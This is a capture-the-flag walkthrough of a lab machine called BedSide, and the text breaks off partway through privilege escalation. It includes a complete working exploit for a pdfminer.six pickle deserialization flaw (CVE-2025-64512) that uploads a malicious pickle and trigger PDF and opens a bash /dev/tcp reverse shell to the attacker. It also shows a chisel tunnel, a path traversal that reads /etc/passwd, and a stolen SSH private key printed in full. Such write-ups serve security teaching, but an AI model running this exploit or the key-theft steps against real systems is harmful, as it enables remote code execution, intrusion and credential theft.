\-----------------------------------------------------------------------------BedSide---------------------------------------------------------------------------------------





Step1:- Reconnaissance





\[#] Lets start the machine by a quick scan!





nmap -A -sS -P -T4  --min-rate 5000 10.129.68.230

Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-07-25 14:08 UTC

Nmap scan report for 10.129.68.230

Host is up (0.26s latency).

Not shown: 997 closed tcp ports (reset)

PORT     STATE    SERVICE VERSION

22/tcp   open     ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)

80/tcp   open     http    Apache httpd 2.4.68

|\_http-title: Did not follow redirect to http://bedside.htb/

|\_http-server-header: Apache/2.4.68 (Debian)

3000/tcp filtered ppp

No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

TCP/IP fingerprint:

OS:SCAN(V=7.94SVN%E=4%D=7/25%OT=22%CT=1%CU=43275%PV=Y%DS=2%DC=T%G=Y%TM=6A64

OS:C392%P=x86\_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=21

OS:)SEQ(SP=105%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=21)SEQ(SP=105%GCD=1%ISR=108%

OS:TI=Z%CI=Z%II=I%TS=21)OPS(O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O

OS:4=M552ST11NW7%O5=M552ST11NW7%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=

OS:FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)T1(R=

OS:Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A

OS:%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y

OS:%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR

OS:%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RU

OS:D=G)IE(R=Y%DFI=N%T=40%CD=S)



Network Distance: 2 hops

Service Info: Host: default; OS: Linux; CPE: cpe:/o:linux:linux\_kernel



TRACEROUTE (using port 23/tcp)

HOP RTT       ADDRESS

1   252.59 ms 10.10.14.1

2   254.88 ms 10.129.68.230



OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 42.46 seconds







\[#] An Extra filtered port 3000!. it should be internally open.





\[#] Lets try looking at the web service!





!\[web-img](images/bedside/n1.png)





\[#] well i found nothing interesting out there, except this basic info!



!\[web-img](images/bedside/n2.png)







\[#] Lets try to look for subdirectories and subdomains!



ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://bedside.htb -H "Host: FUZZ.bedside.htb" -ac -t 100





\[#] Luckily Found a Subdomain. lets add it to out hosts file real quick and see what it got for us



research                \[Status: 200, Size: 3152, Words: 313, Lines: 80, Duration: 633ms]









!\[web-img](images/bedside/n3.png)





\[#] While looking at this web page, it seems like a research about some medical images and data.





\[#] It also has a note written which says........



'Important Notice: Please only upload files in the accepted formats: jpeg, jpg, png, bmp, tiff, dcm, pdf. Unauthorized access or misuse of this portal is strictly prohibited.



Collections can be uploaded as archives.'





\[#] That concludes that the data can be uploaded in the archives format. and it processes these jpeg, jpg, png, bmp, tiff, dcm, pdf image files formats







\[#] Lets try uploading a file and intercept the request via burpsuite to see exactly what happens to these files after uploading!







!\[web-img](images/bedside/n4.png)







\[#] When we closely look at the response header, we see it uses pdfminer.six to process these pdf files!





\[!] What is pdfminer? Pdfminer.six is an open-source Python library used to extract text, layout details, and coordinates from PDF files. It is an updated, community-maintained version of the original PDFMiner tool that adds full support for modern Python 3 environments.





\[#] While looking for some open vulnerabilities for pdfminer and i have found one CVE-2025-64512





\[!] CVE-2025-64512 :- The CMapDB.\_load\_data() function uses Python's pickle.loads() to read font map files (.pickle.gz) without proper safety checks.







\[!] To render text correctly, PDFs use "Character Maps" (CMaps) that map character codes to actual glyphs. pdfminer.six stores safe, pre-built CMap data as .pickle.gz files in its internal cmap/ directory.





The vulnerability exists in the CMapDB.\_load\_data() function. When the library encounters a CMap reference in a PDF, it constructs a file path and uses Python’s pickle.loads() to deserialize it





The fatal flaw is that the library trusts the filename specified inside the PDF. It only checks that the filename ends with .pickle.gz, but it does not prevent Path Traversal or Absolute Paths







\[#] The flaw



\# Simplified vulnerable logic from pdfminer.six

def \_load\_data(cls, name: str) -> Any:

&#x20;   name = name.replace("\\0", "")  # Insufficient sanitization

&#x20;   filename = "%s.pickle.gz" % name # Attacker controls 'name'

&#x20;   path = os.path.join(directory, filename) # If 'name' is absolute, 'directory' is ignored!

&#x20;

&#x20;   # Deserializing untrusted data from an attacker-controlled path

&#x20;   return type(str(name), (), pickle.loads(gzfile.read()))









\[#] When pdfminer.six extracts text from a PDF, it needs to map character codes to actual readable characters. It does this using Character Maps (CMaps). To improve performance, pdfminer.six pre-compiles these CMaps and stores them as .pickle.gz (gzipped Python pickle) files in its internal directory.





\[#] Exploit vector: The fatal flaw is that the name variable is controlled by the attacker via the PDF's /Encoding dictionary.

If the library does not strictly validate that the name is a safe, relative path, an attacker can provide an absolute path (e.g., /tmp/malicious).





Because of how os.path.join works in Python, if the second argument is an absolute path, it completely ignores the first argument (directory). The library will happily open /tmp/malicious.pickle.gz and pass it to pickle.loads().





&#x20;Why Pickle is Dangerous?

Python's pickle module is not secure. It is designed for serializing trusted Python objects, not for parsing untrusted data. When pickle.loads() reads a file, it looks for the \_\_reduce\_\_ magic method on any object. If found, it executes the return value of \_\_reduce\_\_ as code. This is the bridge from "loading a file" to "Remote Code Execution."







\[#] As we don't have any shell access to write the pickle.gz file, which makes the web's upload vector our only way to upload this file. Cause we can't upload them in any random directory, it would throw an error of file not found. because we really don't know where it goes after we upload the file via its web portal.



&#x20;

\[#] Let me show you in a better way, why do we need to know the exact path........





\[#] For now, lets create a pdf file with a temp file reference





5 0 obj

<<

/Type /Font

/Subtype /Type0

/BaseFont /MaliciousFont

/Encoding **/#2Ftmp#2Fmalicious**  <-- Points to /tmp/malicious.pickle.gz

>>

endobj







\[#] Now lets upload this file via the web.





!\[web-img](images/bedside/n4.png)





\[#] It throws an error, MIME type mismatch. **Unable to upload file to destination /var/www/research.bedside.htb/uploads**. that properly explains what happens if use pdf with a different path reference! by doing this, we also got the absolute path on where to upload the file for the pickle file serialization. and to execute our \_\_reduce\_\_ return method!







\[#] Now with all that set, lets grab the shell!





\---------------------------------------------------------------------------------------------------------------------------------------------------------------------------







Step-2: Initial Foothold





\[#] Its a bunch of work. we need to create a \_\_reduce\_\_ method payload and need to convert it into pickle gzip format



\[#] Then we also need to create a .pdf file with cmap characters reference to trigger the pickle.loads() to deserialize it



\[#] And as soon as the the pickle.load() function executes the \_\_reduce\_\_'s return method, we get our code executed at server





\[#] its better if we create a script









import argparse

import gzip

import os

import pickle

import requests





def build\_pickle(lhost, lport, out\_path):

&#x20;   class RCE:

&#x20;       def \_\_reduce\_\_(self):  # the load function specifically looks for \_\_reduce\_\_ method.

&#x20;           cmd = f"bash -c 'bash -i >\& /dev/tcp/{lhost}/{lport} 0>\&1'"

&#x20;           return (os.system, (cmd,))  # This return method will get executed when the load function loads the gzip.

&#x20;   with gzip.open(out\_path, "wb") as f:

&#x20;       pickle.dump(RCE(), f)





def encode\_pdf\_name(path):

&#x20;   out = ""

&#x20;   for ch in path:

&#x20;       if ch.isalnum() or ch in ".-\_":

&#x20;           out += ch

&#x20;       else:

&#x20;           out += "#%02X" % ord(ch) # hexadecimal encoding is needed to avoid string errors, because it accepts only hex format

&#x20;   return out





def build\_pdf(encoding\_name):

&#x20;   return f"""%PDF-1.4

1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj

2 0 obj<</Type/Pages/Kids\[3 0 R]/Count 1>>endobj

3 0 obj<</Type/Page/Parent 2 0 R/MediaBox\[0 0 612 792]/Contents 4 0 R/Resources<</Font<</F1 5 0 R>>>>>>endobj

4 0 obj<</Length 44>>stream

BT /F1 12 Tf 100 700 Td (x) Tj ET

endstream endobj

5 0 obj<</Type/Font/Subtype/Type0/BaseFont/F-Identity-H/Encoding/{encoding\_name}/DescendantFonts\[6 0 R]>>endobj

6 0 obj<</Type/Font/Subtype/CIDFontType2/BaseFont/F/CIDSystemInfo<</Registry(Adobe)/Ordering(Identity)/Supplement 0>>/FontDescriptor 7 0 R>>endobj

7 0 obj<</Type/FontDescriptor/FontName/F/Flags 4/FontBBox\[-1000 -1000 1000 1000]/ItalicAngle 0/Ascent 1000/Descent -200/CapHeight 800/StemV 80>>endobj

xref

0 8

0000000000 65535 f

trailer<</Size 8/Root 1 0 R>>

startxref

0

%%EOF"""





def upload(target, filename, data):

&#x20;   r = requests.post(target.rstrip("/") + "/", files={"uploadFile": (filename, data)}, timeout=15)

&#x20;   return "uploaded successfully" in r.text, r





def main():

&#x20;   ap = argparse.ArgumentParser(description="CVE-2025-64512 pdfminer.six pickle RCE PoC")

&#x20;   ap.add\_argument("-t", "--target-url", required=True,

&#x20;                    help="Base URL of the vulnerable upload portal, e.g. http://research.bedside.htb")

&#x20;   ap.add\_argument("-H", "--lhost", required=True, help="Listener IP for the reverse shell")

&#x20;   ap.add\_argument("-p", "--lport", required=True, type=int, help="Listener port for the reverse shell")

&#x20;   ap.add\_argument("--upload-path", default="/var/www/research.bedside.htb/uploads",

&#x20;                    help="Server-side path the portal saves uploads to (default matches this box)")

&#x20;   ap.add\_argument("--pickle-name", default="payload", help="Base filename for the uploaded pickle (no extension)")

&#x20;   args = ap.parse\_args()



&#x20;   pickle\_file = f"{args.pickle\_name}.pickle.gz"

&#x20;   build\_pickle(args.lhost, args.lport, pickle\_file)

&#x20;   print(f"\[\*] built {pickle\_file}")



&#x20;   ok, \_ = upload(args.target\_url, pickle\_file, open(pickle\_file, "rb"))

&#x20;   if not ok:

&#x20;       print("\[-] pickle upload failed/rejected")

&#x20;       return

&#x20;   print(f"\[+] uploaded {pickle\_file}")



&#x20;   cmap\_target = f"{args.upload\_path.rstrip('/')}/{args.pickle\_name}"

&#x20;   encoded\_name = encode\_pdf\_name(cmap\_target)

&#x20;   pdf\_data = build\_pdf(encoded\_name)



&#x20;   ok, \_ = upload(args.target\_url, "trigger.pdf", pdf\_data)

&#x20;   if not ok:

&#x20;       print("\[-] pdf upload failed/rejected")

&#x20;       return

&#x20;   print("\[+] uploaded trigger.pdf")

&#x20;   print(f"\[\*] start a listener now if you haven't: nc -lvnp {args.lport}")

&#x20;   print("\[\*] the backend polls periodically - wait a bit for the shell")





if \_\_name\_\_ == "\_\_main\_\_":

&#x20;   main()





&#x20;



\[$] build\_pickle() functions builds the pickle payload and then converts it into a pickle gzip file



\[$] encode\_pdf\_name() function specifies the path with hex encoding, cause the name object starts with (like /Encoding) starts with a slash (/) and cannot contain unescaped special characters (like /, spaces, or .).





\[$] def build\_pdf() function build the pdf, Object 5 0 obj defines a Font. When pdfminer.six processes this PDF, it sees this font, extracts the /Encoding name (our hex-encoded absolute path), decodes it, appends .pickle.gz, and attempts to load it.



\[$] upload() method is being used to upload these files via web portal





\[$] The main method provides the upload logic for both the  files.









\[#] So when both the files are uploaded, the server looks at the pdf's metacharacters, that points a reference to cmap, and then the server will look for the /Encode name, as it was user controlled name.



we have provided the name with the path of our pickle payload. at /var/www/research.bedside.htb/uploads directory. and Because of how os.path.join if the second argument is an absolute path, it completely ignores the first argument (directory). The library will happily open /var/www/research.bedside.htb/uploads/malicious.pickle.gz and pass it to pickle.loads().





and when this file gets passed to pickle.load() method, it looks for \_\_reduce\_\_ method. and it executes its return method  ' return (os.system, (cmd,)) ' in our case it will execute our reverse shell payload.



and thus we get our code executed.







\[#] Enough of this boring stuff, now lets execute and see if got the shell!





\# python3 worked.py --target http://research.bedside.htb/ -H 10.10.15.\*\*\*\* --lport 4545



\[\*] built payload.pickle.gz

\[+] uploaded payload.pickle.gz

\[+] uploaded trigger.pdf

\[\*] start a listener now if you haven't: nc -lvnp 4545

\[\*] the backend polls periodically - wait a bit for the shell

&#x20;





\[#] On the listener\~



nc -lvnp 4545

listening on \[any] 4545 ...

connect to \[10.10.15.\*\*\*\*] from (UNKNOWN) \[10.129.68.230] 48186

datawrangler@data-wrangler:/app$ id

id

uid=988(datawrangler) gid=1001(dataops) groups=1001(dataops)







\[#] Foothold granted!





\[#] We got a low privileged shell though!, Now in the beginning the nmap report identified a filtered port at 3000. 





\[#] Since the shell is highly stripped, we can't run any network or process commands. so i tried to look for the /proc filesystem, as it always exposes the states.



\[#] Except there is a script named pdf\_watcher that checks for the /var/www/research.bedside.htb/upload directory every 30 seconds for latest archive data and processes the pdfs and stores them in a folder /datastore/stagging. and it also explains syntactically how and why the exploit worked.



datawrangler@data-wrangler:/app$ cat /proc/net/tcp



&#x20; sl  local\_address rem\_address   st tx\_queue rx\_queue tr tm->when retrnsmt   uid  timeout inode                                                     

&#x20;  0: 0100007F:9CE1 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 12704 1 00000000ef0224ea 100 0 0 10 0     # 40161 (decimal)               

&#x20;  1: 00000000:0050 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 11848 1 00000000d121fe31 100 0 0 10 0     # 80 (HTTP)                

&#x20;  2: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 11822 1 00000000b777bc86 100 0 0 10 0     # 22 (SSH)               

&#x20;  3: E345810A:AF24 880F0A0A:15B3 01 00000012:00000000 01:0000005C 00000000   988        0 17430 2 00000000ab4429f9 110 4 31 10 -1   # 44836 (ephemeral port)







\[#] The output is hex coded and the hex for port 3000 is 0BB8, and we can't see that value here...



\[#] Now where's port 3000?.... this means one two things



&#x09;1.  Port 3000 might be listening on ipv6 rather than ipv4

&#x09;2.  Or else maybe it is not running at all!





\[#] Lets try grepping the 3000 from ipv6...





datawrangler@data-wrangler:/app$ cat /proc/net/tcp6 | grep ':0BB8'



&#x20;  1: 00000000000000000000000000000000:**0BB8** 00000000000000000000000000000000:0000 0A 00000000:00000000 00:00000000 00000000  1000        0 11831 1 00000000c467be95 100 0 0 10 0







\[#] Perfect! we were right about the ipv6 thing. now lets try to see through it





\[#] Lets tunnel it up real quick!



\#Start the listener on your machine....



./chisel-lin server -p 8080 --reverse



\#connect the client with....



./chisel client <your\_ip>:8080 R:3000:127.0.0.1:3000









!\[web-img](images/bedside/n6.png)





\[#] While looking at the page it appears to be nothing more than a static!





\[#] I have also tried finding on subdirectories, but got no luck there.





\[#] However, after analyzing the code properly, it indicates several clues towards one single vulnerability..... 





&#x20;Clue 1: The "Simulated" Data Comment (The Biggest Hint)

&#x09;	



&#x09;// Simulate fetching multi-slice MRI + mask data

&#x09;	async function fetchSlices() {

&#x20; 	// For demo: generate 5 slices with random masks

&#x20; 		const slices = \[];

&#x20; 	// ...





&#x09;The Logic: The developer explicitly left a comment stating that the data is simulated for demo purposes. In a real application, this function would be replaced with an actual 	fetch() call to a backend API, likely passing a filename or directory path as a parameter (e.g., fetch('/api/slice?file=mri\_01.png')).



&#x09;The Takeaway: Whenever you see "simulate" or "demo" in CTF frontend code, it is a giant neon sign indicating: "The real implementation involves reading files, and that file-reading 	logic is where the vulnerability lies."





Clue 2: Dev Server \& HMR Artifacts



&#x09;<script type="module">import createHotContext from"/@hmr";const hot=createHotContext("/index.html");hot.watch(()=>location.reload());</script>

&#x09;<script>console.log("%c💚 Built with esm.sh/x, please uncheck \\"Disable cache\\" in Network tab for better DX!", "color:green")</script>





&#x09;The Logic: The /@hmr (Hot Module Replacement) endpoint and the "better DX" (Developer Experience) console log strongly indicate that this application is being served by a 	development server (like Vite, esbuild, or a custom Node.js dev server), not a hardened production web server.



&#x09;The Takeaway: Development servers are notoriously prone to Path Traversal vulnerabilities. They are designed to be flexible and serve files dynamically from the project directory, 	often using flawed path.join() logic that fails to properly sanitize ../ sequences.



&#x20;Clue 3: Local Vendor Imports



&#x09;import React from './vendor/react.js';

&#x09;import ReactDOM from './vendor/react-dom.js';

&#x09;import \_ from './vendor/lodash.js';





&#x09;The Logic: The application is explicitly configured to serve static assets from a local ./vendor/ directory.

&#x09;

&#x09;The Takeaway: This confirms the server has a static file-serving mechanism. If the server's routing logic uses user-supplied input to construct file paths (e.g., 	fs.readFile('./vendor/' + userInput)), it is a prime candidate for directory traversal (e.g., requesting ../../etc/passwd).





Clue 4: The Domain Context (Medical Imaging)



&#x09;The Logic: The page is titled "Bedside Clinic - Image Viewer" and mentions "MRI + mask data". Medical imaging applications inherently deal with loading files from a datastore (like 	the /datastore/ directory we saw earlier in the box).

&#x09;

&#x09;The Takeaway: The business logic requires file reading. When you combine "file reading" + "dev server artifacts" + "simulated frontend code," Path Traversal becomes the most 	statistically probable vulnerability to test next.





\[#] Now lets try it actually!



curl -s "http://localhost:3000/../../../../etc/passwd" --path-as-is



root:x:0:0:root:/root:/bin/bash

daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

bin:x:2:2:bin:/bin:/usr/sbin/nologin

sys:x:3:3:sys:/dev:/usr/sbin/nologin

sync:x:4:65534:sync:/bin:/bin/sync

games:x:5:60:games:/usr/games:/usr/sbin/nologin

man:x:6:12:man:/var/cache/man:/usr/sbin/nologin

lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin

mail:x:8:8:mail:/var/mail:/usr/sbin/nologin

news:x:9:9:news:/var/spool/news:/usr/sbin/nologin

uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin

proxy:x:13:13:proxy:/bin:/usr/sbin/nologin

www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

backup:x:34:34:backup:/var/backups:/usr/sbin/nologin

list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin

irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin

\_apt:x:42:65534::/nonexistent:/usr/sbin/nologin

nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin

systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin

systemd-timesync:x:991:991:systemd Time Synchronization:/:/usr/sbin/nologin

messagebus:x:990:990:System Message Bus:/nonexistent:/usr/sbin/nologin

sshd:x:989:65534:sshd user:/run/sshd:/usr/sbin/nologin

**developer:x:1000:1000:developer,,,:/home/developer:/bin/bash**

datawrangler:x:988:1001::/home/datawrangler:/bin/sh

\_laurel:x:987:987::/var/log/laurel:/bin/false

polkitd:x:986:986:User for polkitd:/:/usr/sbin/nologin





\[#] We were right about the path traversal vulnerability, and we got to know about out next target user developer



\[!] --path-as-is : the flag used her to bypass the client-side path resolution and forcing the server to handle the raw ../../../../etc/passwd sequence. without this flag it would have 

stripped the sequence into /etc/passwd and it would have throwed a not found error!







\[#] Now that we can read the files, in order to get the developer's shell, we need to steal his ssh keys!



(note:- You can directly read the user flag if you're in hurry!)





&#x20;curl -s "http://localhost:3000/../../../../home/developer/.ssh/id\_rsa" --path-as-is



\-----BEGIN OPENSSH PRIVATE KEY-----

b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW

QyNTUxOQAAACAif7DtVQ9X236vlEhd0VzSJ0ZJVzyrwAb7zT5IOZotAAAAAJj05ixK9OYs

SgAAAAtzc2gtZWQyNTUxOQAAACAif7DtVQ9X236vlEhd0VzSJ0ZJVzyrwAb7zT5IOZotAA

AAAEBySF+9afvOfxLBTbYWcyNm7zOrsXrKdvfkg/vvFZaiwiJ/sO1VD1fbfq+USF3RXNIn

RklXPKvABvvNPkg5mi0AAAAAEWRldmVsb3BlckBiZWRzaWRlAQIDBA==

\-----END OPENSSH PRIVATE KEY-----







\[#] We got the keys! store them in a file and lets grab the shell real quick!





\# ssh -i id\_rsa developer@bedside.htb



================================================================================

|                                                                              |

|                         BEDSIDE CLINIC NETWORK                               | 

|                                                                              |

|          Authorized Access Only. All activities are monitored.               |

|                                                                              |

|  NOTICE TO SYSTEM ADMINISTRATORS:                                            |

|  - Maintain patient data confidentiality and HIPAA compliance.               |

|  - Always check the Change Management schedule before escalating.            |

|  - Follow IT security policies for updates, backups, and monitoring.         |

|                                                                              |

|  SYSTEM OPERATIONS TEAM                                                      |

|  Bedside Clinic - Clinical IT Department                                     |

|                                                                              |

================================================================================



Linux bedside 6.12.95+deb13-amd64 #1 SMP PREEMPT\_DYNAMIC Debian 6.12.95-1 (2026-07-04) x86\_64



The programs included with the Debian GNU/Linux system are free software;

the exact distribution terms for each program are described in the

individual files in /usr/share/doc/\*/copyright.



Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent

permitted by applicable law.





developer@bedside:\~$ id

uid=1000(developer) gid=1000(developer) groups=1000(developer),100(users)





\[#] Access Granted :) 



\--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------





Step-3: Privilege Escalation 





\[#] Now here's when thing become really catchyyy.......





developer@bedside:\~$ sudo -l

Matching Defaults entries for developer on

&#x20;   bedside:

&#x20;   env\_reset, mail\_badpass,

&#x20;   secure\_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin,

&#x20;   use\_pty



User developer may run the following commands on

&#x20;       bedside:

&#x20;   (ALL) NOPASSWD: /usr/bin/python3

&#x20;       /opt/trainer/bedside\_trainer.py





\[#] Developer can run bedside\_trainer.py script or tool as root! lets better take a look at it.





\#!/usr/bin/env python3

"""

Bedside Clinic - MONAI trainer (v0.1.0-beta)



This software is an internal beta release intended for use by company staff and developers

for testing, experimentation, and development purposes only.



Key points:



\- Staff must \*\*exercise caution\*\* and ensure proper backups of any data used with this tool.

\- This tool should \*\*not be used for clinical decision-making\*\* or in patient care.

\- Further development, testing, and validation are required before any production deployment.



Usage:

&#x20;   python bedside\_trainer.py \[--epochs N] \[--batch-size N] \[--lr LR] \[--scanner /dev/usbscanner0]



Notes:

\- Root access is required if specifying a hardware scanner.

\- RAW\_DIR is currently a placeholder for future integration. Preprocessing features will be added in the future to handle more complex files (DICOM, NIfTI, etc.)

\- Current data flow is as follows: \[staging/] > \[processed/] > (DataLoader) > model

\- Script is currently fully functional with image files (jpeg, png, etc.). Refer to allowed extensions for supported types. 



"""



import os

import sys

import shutil

import argparse

from pathlib import Path

from datetime import datetime

import logging

import warnings

import torch

import torch.nn as nn

import torch.optim as optim

from torch.utils.tensorboard import SummaryWriter

from torch.utils.data import DataLoader



\# MONAI imports

warnings.filterwarnings("ignore", category=FutureWarning)

from monai.data import Dataset, CacheDataset

from monai.transforms import (

&#x20;   Compose, LoadImaged, EnsureChannelFirstd, ScaleIntensityd,

&#x20;   RandSpatialCropd, ToTensord, EnsureTyped, ResizeWithPadOrCropd

)

from monai.handlers import CheckpointLoader  # <-- Correct import



\# --------------------------

\# Datastore paths

\# --------------------------

DATASTORE\_ROOT = Path("/datastore")

CHECKPOINT\_DIR = DATASTORE\_ROOT / "checkpoints"

LOGS\_DIR = DATASTORE\_ROOT / "logs"

MODELS\_DIR = DATASTORE\_ROOT / "models"

PROCESSED\_DIR = DATASTORE\_ROOT / "processed"

RAW\_DIR = DATASTORE\_ROOT / "raw"

STAGING\_DIR = DATASTORE\_ROOT / "staging"



for d in (CHECKPOINT\_DIR, LOGS\_DIR, MODELS\_DIR, PROCESSED\_DIR, RAW\_DIR, STAGING\_DIR):

&#x20;   d.mkdir(parents=True, exist\_ok=True)



\# --------------------------

\# Logging setup

\# --------------------------

log\_file = LOGS\_DIR / f"training\_{datetime.now().strftime('%Y%m%d-%H%M%S')}.log"

logging.basicConfig(

&#x20;   level=logging.INFO,

&#x20;   format="%(asctime)s | %(levelname)s | %(message)s",

&#x20;   handlers=\[

&#x20;       logging.FileHandler(log\_file),

&#x20;       logging.StreamHandler(sys.stdout)

&#x20;   ]

)

logger = logging.getLogger(\_\_name\_\_)



\# --------------------------

\# File types

\# --------------------------

ALLOWED\_EXTS = {

&#x20;   "jpeg", "jpg", "png", "bmp", "tiff", "tif",

&#x20;   "gif", "dcm", "ima", "mhd", "raw", "nrrd",

&#x20;   "nii", "gz", "hdr", "img", "zip", "tar", "tar.gz", "7z",

&#x20;   "pdf", "txt", "npy"

}



\# --------------------------

\# Device

\# --------------------------

DEVICE = torch.device("cuda" if torch.cuda.is\_available() else "cpu")



\# --------------------------

\# Utility functions

\# --------------------------

def find\_latest\_checkpoint(checkpoint\_dir: Path):

&#x20;   ckpts = sorted(checkpoint\_dir.glob("\*.pt"), key=os.path.getmtime)

&#x20;   return ckpts\[-1] if ckpts else None



def is\_nifti(p: Path):

&#x20;   return p.suffix in (".nii", ".gz") and (p.name.endswith(".nii") or p.name.endswith(".nii.gz"))



def collect\_processed\_files(processed\_dir: Path, limit=None):

&#x20;   files = \[p for p in processed\_dir.glob("\*\*/\*") if p.is\_file() and p.suffix.lower().lstrip(".") in ALLOWED\_EXTS]

&#x20;   if limit:

&#x20;       files = files\[:limit]

&#x20;   return \[{"image": str(p)} for p in files]



def conservative\_promote\_from\_staging(staging\_dir: Path, processed\_dir: Path, max\_files=100):

&#x20;   promoted = 0

&#x20;   for p in sorted(staging\_dir.iterdir()):

&#x20;       if promoted >= max\_files:

&#x20;           break

&#x20;       if not p.is\_file():

&#x20;           continue

&#x20;       ext = p.suffix.lower().lstrip(".")

&#x20;       if ext in ALLOWED\_EXTS:

&#x20;           dest = processed\_dir / p.name

&#x20;           try:

&#x20;               shutil.move(str(p), str(dest))

&#x20;               promoted += 1

&#x20;           except Exception as e:

&#x20;               logger.warning(f"Failed to promote {p}: {e}")

&#x20;   return promoted



def prepare\_dataloader\_from\_processed(processed\_dir: Path, batch\_size: int):

&#x20;   data = collect\_processed\_files(processed\_dir)

&#x20;   if not data:

&#x20;       return None, 0



&#x20;   contains\_nifti = any(is\_nifti(Path(d\["image"])) for d in data)



&#x20;   if contains\_nifti:

&#x20;       transforms = Compose(\[

&#x20;           LoadImaged(keys=\["image"]),

&#x20;           EnsureChannelFirstd(keys=\["image"]),

&#x20;           ScaleIntensityd(keys=\["image"]),

&#x20;           RandSpatialCropd(keys=\["image"], roi\_size=(64,64,64), random\_size=False),

&#x20;           EnsureTyped(keys=\["image"])

&#x20;       ])

&#x20;       dataset = CacheDataset(data=data, transform=transforms, cache\_rate=1.0, num\_workers=1)

&#x20;   else:

&#x20;       transforms = Compose(\[

&#x20;           LoadImaged(keys=\["image"]),

&#x20;           EnsureChannelFirstd(keys=\["image"]),

&#x20;           ScaleIntensityd(keys=\["image"]),

&#x20;           ResizeWithPadOrCropd(keys=\["image"], spatial\_size=(64,64)),

&#x20;           ToTensord(keys=\["image"]),

&#x20;           EnsureTyped(keys=\["image"])

&#x20;       ])

&#x20;       dataset = Dataset(data=data, transform=transforms)



&#x20;   dataloader = DataLoader(dataset, batch\_size=batch\_size, shuffle=True, num\_workers=1)

&#x20;   return dataloader, len(data)



def build\_model(dataloader=None, hidden\_dim=128):

&#x20;   if dataloader is None:

&#x20;       raise ValueError("Dataloader must be provided to infer input size.")

&#x20;   sample\_batch = next(iter(dataloader))\["image"].to(torch.device("cpu"))

&#x20;   n\_features = sample\_batch.numel() // sample\_batch.shape\[0]

&#x20;   logger.info(f"Auto-detected input features: {n\_features}")

&#x20;   model = nn.Sequential(

&#x20;       nn.Flatten(),

&#x20;       nn.Linear(n\_features, hidden\_dim),

&#x20;       nn.ReLU(),

&#x20;       nn.Linear(hidden\_dim, 1)

&#x20;   )

&#x20;   return model



\# --------------------------

\# Main

\# --------------------------

def main():

&#x20;   parser = argparse.ArgumentParser(description="MONAI trainer with datastore integration")

&#x20;   parser.add\_argument("--epochs", "-e", type=int, default=50, help="Number of training epochs")

&#x20;   parser.add\_argument("--batch-size", "-b", type=int, default=4, help="Batch size")

&#x20;   parser.add\_argument("--lr", type=float, default=1e-3, help="Learning rate")

&#x20;   parser.add\_argument("--scanner", type=str, default=None, help="Hardware scanner device (requires root)")

&#x20;   args = parser.parse\_args()



&#x20;   if args.scanner and os.geteuid() != 0:

&#x20;       logger.error("Root access required to use a hardware scanner. Exiting.")

&#x20;       sys.exit(1)



&#x20;   NUM\_EPOCHS = args.epochs

&#x20;   BATCH\_SIZE = args.batch\_size

&#x20;   LEARNING\_RATE = args.lr

&#x20;   SAVE\_INTERVAL = 5



&#x20;   logger.info(f"Device: {DEVICE}")



&#x20;   dataloader, n\_data = prepare\_dataloader\_from\_processed(PROCESSED\_DIR, BATCH\_SIZE)

&#x20;   if n\_data == 0:

&#x20;       promoted = conservative\_promote\_from\_staging(STAGING\_DIR, PROCESSED\_DIR, max\_files=200)

&#x20;       if promoted:

&#x20;           logger.info(f"Promoted {promoted} files from staging -> processed")

&#x20;           dataloader, n\_data = prepare\_dataloader\_from\_processed(PROCESSED\_DIR, BATCH\_SIZE)

&#x20;       else:

&#x20;           logger.warning("No data available to train. Exiting.")

&#x20;           return



&#x20;   logger.info(f"Using {n\_data} samples for training.")



&#x20;   model = build\_model(dataloader).to(DEVICE)

&#x20;   optimizer = optim.Adam(model.parameters(), lr=LEARNING\_RATE)

&#x20;   loss\_fn = nn.MSELoss()



&#x20;   # --------------------------

&#x20;   # Checkpoint loading (MONAI-compatible callable form)

&#x20;   # --------------------------

&#x20;   latest\_ckpt = find\_latest\_checkpoint(CHECKPOINT\_DIR)

&#x20;   start\_epoch = 0

&#x20;   if latest\_ckpt:

&#x20;       logger.info(f"Found checkpoint {latest\_ckpt}, loading with CheckpointLoader (callable mode)...")

&#x20;       loader = CheckpointLoader(

